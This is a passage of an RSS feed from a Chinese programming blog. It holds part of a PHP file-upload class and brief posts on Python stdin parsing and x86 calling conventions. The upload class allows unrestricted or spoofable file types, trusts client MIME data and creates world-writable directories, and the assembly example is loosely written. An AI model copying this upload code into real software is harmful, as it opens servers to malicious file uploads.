&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $this-&gt;returnArray[]=$this-&gt;returninfo;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }else{<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $this-&gt;returninfo['error'] = $this-&gt;errmsg();<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $this-&gt;returnArray[]=$this-&gt;returninfo;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return $this-&gt;errno ?&nbsp;&nbsp;false :&nbsp;&nbsp;true;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp; return false;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp; }else{<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp; $this-&gt;errno = 10;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp; return false;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; // 单个文件上传<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; function copyfile($fileArray){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $this-&gt;returninfo = array();<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; // 返回信息<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $this-&gt;returninfo['name'] = $fileArray['name'];<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $this-&gt;returninfo['saveName'] = $this-&gt;saveName;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $this-&gt;returninfo['size'] = number_format( ($fileArray['size'])/1024 , 0, '.', ' ');//以 B 为单位<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $this-&gt;returninfo['type'] = $fileArray['type'];<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; // 检查文件格式<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if (!$this-&gt;validateFormat()){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $this-&gt;errno = 11;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return false;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; // 检查目录是否可写<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(!@is_writable($this-&gt;savePath)){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $this-&gt;errno = 12;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return false;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; // 如果不允许覆盖，检查文件是否已经存在<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if($this-&gt;overwrite == 0 &amp;&amp; @file_exists($this-&gt;savePath.$fileArray['name'])){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $this-&gt;errno = 13;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return false;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; // 如果有大小限制，检查文件是否超过限制<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if ($this-&gt;maxSize != 0 ){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if ($fileArray["size"] &gt; $this-&gt;maxSize){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $this-&gt;errno = 14;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return false;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; // 文件上传<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(!@copy($fileArray["tmp_name"], $this-&gt;savePath.$this-&gt;saveName)){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $this-&gt;errno = $fileArray["error"];<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return false;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; // 删除临时文件<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(!@$this-&gt;del($fileArray["tmp_name"])){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return false;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return true;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; // 文件格式检查<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; function validateFormat(){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(!is_array($this-&gt;fileFormat) || in_array(strtolower($this-&gt;ext), $this-&gt;fileFormat) || in_array(strtolower($this-&gt;type), $this-&gt;fileFormat)) return true;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; else return false;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //获取文件扩展名<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; function getExtType($file){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $ext = explode(".", $file['name']);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $ext = $ext[count($ext) - 1];<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $this-&gt;ext = $ext;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $this-&gt;type = $file['type'];<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //设置上传文件的最大字节限制<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; // @param $maxSize 文件大小(bytes) 0:表示无限制<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; function setMaxsize($maxSize){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $this-&gt;maxSize = $maxSize;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //设置文件格式限定<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; // @param $fileFormat 文件格式数组<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; function setFileformat($fileFormat){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(is_array($fileFormat)) { $this-&gt;fileFormat = $fileFormat; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //设置覆盖模式<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; // @param overwrite 覆盖模式 1:允许覆盖 0:禁止覆盖<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; function setOverwrite($overwrite){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $this-&gt;overwrite = $overwrite;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br><br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //设置保存路径<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; // @param $savePath 文件保存路径：以 "/" 结尾，若没有 "/"，则补上<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; function setSavepath($savePath){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $this-&gt;savePath = substr( str_replace("\\","/", $savePath) , -1) == "/" ? $savePath : $savePath."/";<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(!is_dir($this-&gt;savePath)) {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $d = str_replace("\\", "/", $this-&gt;savePath);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $dir_arr = explode("/", $d);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(count($dir_arr) &gt; 0) {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $end_dir = "";<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; for($i=0; $i&lt;count($dir_arr); $i++) {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $end_dir .= $dir_arr[$i]."/";<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(!is_dir($end_dir)) mkdir($end_dir, 0777);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //设置文件保存名<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; // @saveName 保存名，如果为空，则系统自动生成一个随机的文件名<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; function setSavename($saveName){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if ($saveName == ''){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $name=date('YmdHis')."_".rand(100,999).'.'.$this-&gt;ext;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; } else {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $name = $saveName;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $this-&gt;saveName = $name;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //删除文件<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; // @param $fileName 所要删除的文件名<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; function del($fileName){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(!@unlink($fileName)){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $this-&gt;errno = 15;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return false;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return true;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; // 返回上传文件的信息<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; function getInfo(){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return $this-&gt;returnArray;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; // 得到错误信息<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; function errmsg(){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $uploadClassError = array(<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 0=&gt;'There is no error, the file uploaded with success.',<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 1=&gt;'The uploaded file exceeds the upload_max_filesize directive in php.ini.',<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 2=&gt;'The uploaded file exceeds the MAX_FILE_SIZE directive that was specified in the HTML form.&nbsp;&nbsp;',<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 3=&gt;'The uploaded file was only partially uploaded. ',<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 4=&gt;'No file was uploaded. ',<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 6=&gt;'Missing a temporary folder. Introduced in PHP 4.3.10 and PHP 5.0.3. ',<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 7=&gt;'Failed to write file to disk. Introduced in PHP 5.1.0. ',<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 10=&gt;'Input name is not unavailable!',<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 11=&gt;'The uploaded file is Unallowable!',<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 12=&gt;'Directory unwritable!',<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 13=&gt;'File exist already!',<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 14=&gt;'File is too big!',<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 15=&gt;'Delete file unsuccessfully!',<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; );<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if ($this-&gt;errno == 0) return false;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; else return $uploadClassError[$this-&gt;errno];<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>}<br>?&gt;<br><br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Web Skills</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200942744129261/</guid>
    </item>
    <item>
      <title>
<![CDATA[Python的IO操作]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720098495140551/</link>
      <description>
<![CDATA[<co>3 5 4<br>
abc<br>
bca<br>
dac<br>
dbc<br>
cba<br>
(ab)(bc)(ca)<br>
abc<br>
(abc)(abc)(abc)<br>
(zyx)bc<br><co><br>对于上面的输入，用C++实现很方便<br>cin&gt;&gt;a&gt;&gt;b&gt;&gt;c; <br>for(i=0;i&lt;b;i++){cin&gt;&gt;s;...} <br>for(i=0;i&lt;c;i++){cin&gt;&gt;s;..}<br><br>而如果使用python，如何读入呢? 有一种方法如下所示<br>f=sys.stdin.readlines() #一次全部读入<br>L,D,N=map(int,f[0].rstrip('\n').split(' '))#第一行去掉换行符，然后根据空格分割，然后转成空格<br>for i in range(D):<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print(f[i+1].rstrip('\n')) #每行都去掉空格<br>for i in range(1,N+1):<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print(f[D+i].rstrip('\n')) #每行都去掉空格<br>但这种写法实在违背python优雅的代码风格，追求新方法ing<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720098495140551/</guid>
    </item>
    <item>
      <title>
<![CDATA[_cdecl和_stdcall]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720103286231877/</link>
      <description>
<![CDATA[_cdecl是C/C++默认的函数定义方式，函数参数的入栈和恢复SP都是在函数调用的地方完成，因此可以实现可变参数<br>如：<br>push -8%ebp<br>
push -4%ebp<br>
call f<br>
add 8,ebp<br><br>_stdcall、WINAPI、CALLBACK、PASCAL则是在函数体内完成SP的恢复，因此不支持可变参数。<br>如：<br>push -8%ebp<br>

push -4%ebp<br>

call f<br>

然后在f结尾的时候， ret 8<br><br>因此，_cdecl和stdcall函数是有区别的，glutDisplayFunc()之类的函数参数类型需要注意。<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720103286231877/</guid>
    </item>
    <item>
      <title>
<![CDATA[xml-rpc调用]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201032844740100/</link>
      <description>
